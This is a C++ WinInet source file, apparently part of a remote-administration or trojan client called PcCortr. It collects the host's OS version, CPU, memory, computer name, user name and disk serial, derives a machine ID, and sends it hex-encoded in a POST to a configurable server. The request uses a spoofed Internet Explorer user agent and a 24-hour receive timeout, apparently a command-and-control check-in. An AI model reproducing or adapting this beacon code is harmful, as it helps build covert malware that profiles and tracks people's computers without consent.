// MyHttpBase.cpp: implementation of the CMyHttpBase class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "PcCortr.h"
#include "MyHttpBase.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyHttpBase::CMyHttpBase()
{
	hHttpFp = NULL;
	hHttpIe = NULL;
	hHttpHc = NULL;
}

CMyHttpBase::~CMyHttpBase()
{
	StopWork();
}

void CMyHttpBase::StopWork()
{
	if(hHttpFp != NULL)
	{
		InternetCloseHandle(hHttpFp);
		hHttpFp = NULL;
	}
	if(hHttpHc != NULL)
	{
		InternetCloseHandle(hHttpHc);
		hHttpHc = NULL;
	}
	if(hHttpIe != NULL)
	{
		InternetCloseHandle(hHttpIe);
		hHttpIe = NULL;
	}
}

/*	
**	函数名称:	ConnectHttpServer
**	函数功能:	连接到服务器
**	传入参数:	m_ServerAddr : 服务器IP
				m_ServerPort : 服务器端口
				nCmd		 : 连接类型	
**	传出参数:	无
**	引用函数:	无
**	返回值	:	布尔型
**	备注	:	
*/
BOOL CMyHttpBase::ConnectHttpServer(char* m_ServerAddr , 
									int m_ServerPort,
									int nCmd, DWORD nStyle)
{
	//中断上次连接
	StopWork();

	//检查数据有效性
	if(strlen(m_ServerAddr) == 0
		|| m_ServerPort == 0)
		return FALSE;

	//初始化HTTP环境
	hHttpIe = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.0; "
							"Windows NT 5.0; .NET CLR 1.1.4322)",
							INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
	if(!hHttpIe) return FALSE;
		
	//填充主机地址
	hHttpHc = InternetConnect(hHttpIe,
		m_ServerAddr , m_ServerPort , NULL, 
		NULL , INTERNET_SERVICE_HTTP,0,0);	
	if(!hHttpHc)
	{
		StopWork();
		return FALSE;
	}

	//填充上送当前客户信息
	char m_Url[4096] = {0};
	char m_ExternData[2048] = {0};
	GetMySysInfo(m_ExternData);
	sprintf(m_Url,"%d%s",nCmd,m_ExternData);
	hHttpFp = HttpOpenRequest(hHttpHc,
		"POST",m_Url,NULL,NULL,NULL,nStyle,NULL);
	if(!hHttpFp)
	{
		StopWork();
		return FALSE;
	}

	DWORD m_TimeOut = 24 * 3600 * 1000;
	if(!InternetSetOption(hHttpFp,
		INTERNET_OPTION_RECEIVE_TIMEOUT,&m_TimeOut,sizeof(DWORD)))
	{
		StopWork();
		return FALSE;
	}
	return TRUE;
}

/*	
**	函数名称:	GetMySysInfo
**	函数功能:	取计算机相关信息
**	传入参数:	无
**	传出参数:	m_TransData	: 转为ASCII码的数据缓冲
**	引用函数:	无
**	返回值	:	无
**	备注	:	
*/
void CMyHttpBase::GetMySysInfo(char* pData)
{
	LOGININFO m_SysInfo = {0};

	//取操作系统
	m_SysInfo.m_SysType = IsShellSysType();

	//取CPU信息
	SYSTEM_INFO	m_pSysInfo = {0};
	GetSystemInfo(&m_pSysInfo);
	m_SysInfo.m_CpuSpeed = 0;
	m_SysInfo.m_CpuCount = (UINT) m_pSysInfo.dwNumberOfProcessors;
	
	//取内存容量
	MEMORYSTATUS Buffer = {0};
	GlobalMemoryStatus(&Buffer);
	m_SysInfo.m_MemContent = Buffer.dwTotalPhys/1024;

	//计算机名称
	DWORD m_Len = 63;
	GetComputerName(m_SysInfo.m_PcName,&m_Len);

	//取用户名
	DWORD len = 32;
	GetUserName(m_SysInfo.m_UserName,&len);

	//生成内部标识
	DWORD SeriaNumber = 0;
	GetVolumeInformation("C:\\",NULL,NULL,
		&SeriaNumber,NULL,NULL,NULL,NULL);
	char m_DesKey[10] = {0};
	sprintf(m_DesKey,"%08x",SeriaNumber);
	char m_SmallBuf[100] = {0};
	memset(m_SmallBuf,0,sizeof(m_SmallBuf));
	for(int i = 0; i < 8; i++)
	{
		m_SmallBuf[i] = m_SysInfo.
			m_PcName[i] ^ m_DesKey[i];
	}
	BcdToAsc((BYTE*) m_SmallBuf,(BYTE*) m_SysInfo.ID,8);

	BcdToAsc((BYTE*) &m_SysInfo , 
		(BYTE*) pData , sizeof(LOGININFO));
}

void CMyHttpBase::BcdToAsc(BYTE *BcdStr,BYTE*AscStr,int BcdStrLen)
{
	int j = 0;
	for(int i = 0; i < BcdStrLen; i++)
	{
		j = (BcdStr[i] >> 4) & 0x0f;
  		if(j > 9)
			AscStr[2 * i] = j + 'A' - 10;
		else
			AscStr[2 * i] = j + '0';
		j = BcdStr[i] & 0x0f;
		if(j > 9)
			AscStr[2 * i + 1 ] = j + 'A' - 10;
		else
			AscStr[2 * i + 1] = j + '0';
	}
}

Type IsShellSysType()
{
   Type  ShellType;
   DWORD winVer;
   OSVERSIONINFO *osvi;
   winVer=GetVersion();
   if(winVer<0x80000000)
   {
	  //WINNT
      ShellType=WindowsNT3;
      osvi= (OSVERSIONINFO *)malloc(sizeof(OSVERSIONINFO));
      if (osvi!=NULL)
	  {
         memset(osvi,0,sizeof(OSVERSIONINFO));
         osvi->dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
         GetVersionEx(osvi);
         if(osvi->dwMajorVersion==4L)ShellType=WindowsNT4;
         else if(osvi->dwMajorVersion==5L&&osvi->dwMinorVersion==0L)
			 ShellType=Windows2000;
         else if(osvi->dwMajorVersion==5L&&osvi->dwMinorVersion==1L)
			 ShellType=WindowsXP;
         free(osvi);
      }
   }
   else if  (LOBYTE(LOWORD(winVer))<4)
      ShellType=Windows32s;
   else{
      ShellType=Windows95;
      osvi= (OSVERSIONINFO *)malloc(sizeof(OSVERSIONINFO));
      if (osvi!=NULL){
         memset(osvi,0,sizeof(OSVERSIONINFO));
         osvi->dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
         GetVersionEx(osvi);
         if(osvi->dwMajorVersion==4L&&osvi->dwMinorVersion==10L)
			 ShellType=Windows98;
         else if(osvi->dwMajorVersion==4L&&osvi->dwMinorVersion==90L)
			 ShellType=WindowsME;
         free(osvi);
      }
   }
   return ShellType;
}



